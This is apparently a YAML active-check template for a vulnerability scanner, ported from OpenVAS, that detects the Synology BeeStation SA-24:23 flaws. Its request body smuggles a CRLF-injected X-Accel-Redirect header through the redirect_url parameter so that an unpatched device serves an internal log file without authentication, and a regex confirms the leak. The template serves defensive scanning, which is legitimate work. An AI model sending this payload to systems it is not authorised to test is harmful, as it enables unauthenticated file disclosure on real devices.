# Synology BeeStation (BSM) Multiple Vulnerabilities — Synology-SA-24:23
# (CVE-2024-10441 / CVE-2024-10445 / CVE-2024-50629)
#
# Synology BeeStation (BSM) bundles Synology Drive Server, whose
# SYNO.API.Auth.RedirectURI webapi handler reflects the attacker-controlled
# `redirect_url` parameter into the nginx response headers without sanitising
# CRLF. By injecting an `X-Accel-Redirect` header pointing at an internal
# path, an unauthenticated request makes nginx serve a file it should never
# expose — here the Synology Drive worker log
# (/volume1/@synologydrive/log/cloud-workerd.log). The leaked log embeds the
# source-file names of the compiled Drive Server components
# (…checkpoint-task.cpp.o / …job-queue-client.cpp.o), confirming the file was
# actually served rather than a normal JSON API reply.
#
# SA-24:23 is a distinct Synology advisory from SA-24:21 (CVE-2024-50630/50631,
# see synology/CVE-2024-50630.yaml) but OpenVAS confirms both with the same safe
# active check — the CRLF / X-Accel-Redirect disclosure of cloud-workerd.log —
# so the two feeds legitimately share the synology-mock fixture.
#
# Detection (safe, response analysis — CRLF/X-Accel-Redirect file disclosure):
#   POST /webapi/entry.cgi with body
#     api=SYNO.API.Auth.RedirectURI&version=1&method=run&session=finder&
#     redirect_url=https://dsfinder.synology.com/dsm/login?<CRLF>
#     X-Accel-Redirect:/volume1/@synologydrive/log/cloud-workerd.log
#   → response body (the served log file) carries the compiled Drive Server
#     source-file names:  (checkpoint-task|job-queue-client)\.cpp\.o
#   A patched BeeStation strips the CRLF / rejects the injection and returns
#   the normal JSON API error (no served log file) → zero findings.
#
# Ported from OpenVAS/Greenbone NASL 2025/synology/gb_bsm_SA_24_23_active.nasl
# (GPL-2.0-only). Request body, injected header and path kept faithful to the
# source; the match targets the source-file literals from the NASL confirm
# condition. Detection stops at the log disclosure (QoD 75), a documented
# simplification of the NASL's follow-on token extraction.
uid: 198eedb0-67b2-4492-a831-7ea346ea621e
name: "Synology BeeStation (BSM) Multiple Vulnerabilities (Synology-SA-24:23) — Active Check"
description: |
  Synology BeeStation (BSM) is prone to multiple vulnerabilities in the bundled
  Synology Drive Server. The SYNO.API.Auth.RedirectURI handler reflects the
  attacker-controlled redirect_url into the nginx response headers without CRLF
  sanitisation, so an unauthenticated POST injecting an X-Accel-Redirect header
  makes nginx serve an internal file — the Drive worker log
  (cloud-workerd.log) — whose embedded source-file names (.cpp.o) confirm the
  file disclosure on an exposed, unpatched instance.
cves: [CVE-2024-10441, CVE-2024-10445, CVE-2024-50629]
cvss: 10.0
severity: critical
confidence_base: 0.30
category: file-read
tags: [synology, beestation, bsm, drive-server, info-disclosure, webapi]
services: [http, https]
author: noctis
version: "1.0.0"
references:
  - "https://nvd.nist.gov/vuln/detail/CVE-2024-10441"
  - "https://nvd.nist.gov/vuln/detail/CVE-2024-10445"
  - "https://nvd.nist.gov/vuln/detail/CVE-2024-50629"
  - "https://www.synology.com/security/advisory/Synology_SA_24_23"
  - "OpenVAS/Greenbone NASL 2025/synology/gb_bsm_SA_24_23_active.nasl (GPL-2.0-only)"

steps:
  - id: entry-probe
    action: http_request
    method: POST
    path: "/webapi/entry.cgi"
    port: "{{port}}"
    tls_insecure: true
    follow_redirects: false
    timeout_secs: 10
    headers:
      Content-Type: "application/x-www-form-urlencoded"
    body: "api=SYNO.API.Auth.RedirectURI&version=1&method=run&session=finder&redirect_url=https://dsfinder.synology.com/dsm/login?\r\nX-Accel-Redirect:/volume1/@synologydrive/log/cloud-workerd.log"
    store_as: resp

  - id: match-debug-leak
    action: match
    source: resp.body
    pattern: "(checkpoint-task|job-queue-client)\\.cpp\\.o"
    on_match:
      finding:
        confidence_delta: 0.50
        qod: 75
        evidence: "Synology Drive worker log served via SYNO.API.Auth.RedirectURI X-Accel-Redirect CRLF injection: {{resp.body}}"
      stop: true
